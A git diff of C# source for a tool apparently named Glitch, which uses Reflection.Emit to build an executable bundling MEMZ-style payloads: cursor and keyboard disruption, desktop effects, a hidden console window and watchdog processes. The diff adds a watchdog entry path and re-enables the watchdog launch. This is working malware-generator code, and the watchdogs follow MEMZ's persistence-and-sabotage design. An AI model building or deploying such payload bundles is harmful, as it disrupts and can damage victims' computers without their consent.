@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Reflection.Emit;
+using System.Runtime.CompilerServices;
 using System.Threading;
 using GlitchPayloads;
 using ILRepacking;
@@ -53,11 +54,30 @@ namespace Glitch
             ModuleBuilder mb = ab.DefineDynamicModule(aName.Name, aName.Name + ".exe");
             TypeBuilder tb = mb.DefineType("Program", TypeAttributes.Public);
             MethodBuilder entry =
-                tb.DefineMethod("Main", MethodAttributes.Public | MethodAttributes.Static, null, null);
+                tb.DefineMethod("Main", MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig, null, new[]{typeof(string[])});
+            ParameterBuilder bld = entry.DefineParameter(1, ParameterAttributes.None, "args");
             ab.SetEntryPoint(entry);
             ILGenerator il = entry.GetILGenerator();
+            Label retLab = il.DefineLabel();
             il.Emit(OpCodes.Nop);
+            if (runWds)
+            {
+                il.DeclareLocal(typeof(bool));
+                Label lab2 = il.DefineLabel();
+                il.Emit(OpCodes.Ldarg_0);
+                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("ShouldRunWD"), new []{typeof(string[])});
+                
+                il.Emit(OpCodes.Stloc_0);
+                il.Emit(OpCodes.Ldloc_0);
+                il.Emit(OpCodes.Brfalse_S, lab2);
+                il.Emit(OpCodes.Nop);
+                il.EmitCall(OpCodes.Call, typeof(WatchDog).GetMethod("Run"), null);
+                il.Emit(OpCodes.Nop);
+                il.Emit(OpCodes.Br_S, retLab);
+                il.MarkLabel(lab2);
+            }
             il.EmitWriteLine($"Running Glitch Payload Bundle... (Config: {string.Join(", ", payloads)})");
+            il.Emit(OpCodes.Nop);
             if (showNp)
             {
                 il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("ShowNotepad"), null);
@@ -93,12 +113,12 @@ namespace Glitch
                 il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("HideCmd"), null);
                 il.Emit(OpCodes.Nop);
             }
-            /* TODO fix WDs (Check if should run as WD, might require some extra work for the entry point)
             if (runWds)
             {
                 il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("RunWDs"), null);
                 il.Emit(OpCodes.Nop);
-            }*/
+            }
+            il.MarkLabel(retLab);
             il.Emit(OpCodes.Ret);
             tb.CreateType();
             ab.Save(aName.Name + ".exe");
@@ -128,15 +148,22 @@ namespace Glitch
             return tmp.ToArray();
         }
 
-        public static void ILTest() // used for finding IL code using the IDE-integrated IL-Viewer
+        public static void ILTest(string[] args) // used for finding IL code using the IDE-integrated IL-Viewer
         {
-            StandardCommands.ShowNotepad();
+            if (StandardCommands.ShouldRunWD(args))
+            {
+                WatchDog.Run();
+                return;
+            }
+            /*StandardCommands.ShowNotepad();
             StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadCursor), 15000, 47).Start();
             StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadKeyboard), 25, 35).Start();
             StandardCommands.GetSelfHostedRunner(StandardCommands.GetMethodInfo(Broadcast.PayloadDesktopEyes), 666)
                 .Start();
             StandardCommands.LaunchIncrementor();
-            StandardCommands.HideCmd();
+            StandardCommands.HideCmd();*/
+            Console.WriteLine("Running Glitch Payload Bundle... (Config: SOMESHIT)");
+            StandardCommands.LaunchIncrementor();
             StandardCommands.RunWDs();
         }
     }
